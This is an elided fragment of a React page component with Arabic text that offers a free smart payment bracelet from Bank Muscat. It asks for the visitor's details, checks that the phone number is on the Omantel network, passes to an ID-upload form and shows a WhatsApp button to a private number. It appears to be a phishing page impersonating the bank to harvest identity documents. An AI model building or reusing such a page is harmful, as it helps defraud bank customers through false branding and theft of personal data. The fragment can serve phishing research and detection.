  ...
  return (
    <>
      {currentStep === "1" ? (
          ...
          {!isDone ? (
            ...
            <div className="max-w-md mx-auto">
              <div className="text-center mb-8">
                ...
                <h1 className="text-2xl font-bold text-slate-800 mb-2 text-balance">
                  احصل على سوار الدفع الذكي من بنك مسقط
                </h1>
                <p className="text-slate-600 text-sm leading-relaxed">
                  أدخل معلوماتك للحصول على سوار الدفع الذكي من بنك مسقط مجاناً
                </p>
              </div>
                      ...
                      <div className="relative">
                        ...
                        {!isOmnTel ? (
                          <span className="text-red-600">
                            الرقم المدخل غير تابع لعمان تل
                          </span>
                        ) : null}
                      </div>
                    </div>
        ...
        <IdUploadForm setCurrentStep={setCurrentStep as any} />
      ) : (
      ...
      <Link href={"https://wa.me/96871129904"}>
        <Button
          size="icon"
          className="bg-red-600 fixed right-2 bottom-4 rounded-full p-2 h-12 w-12"
        >
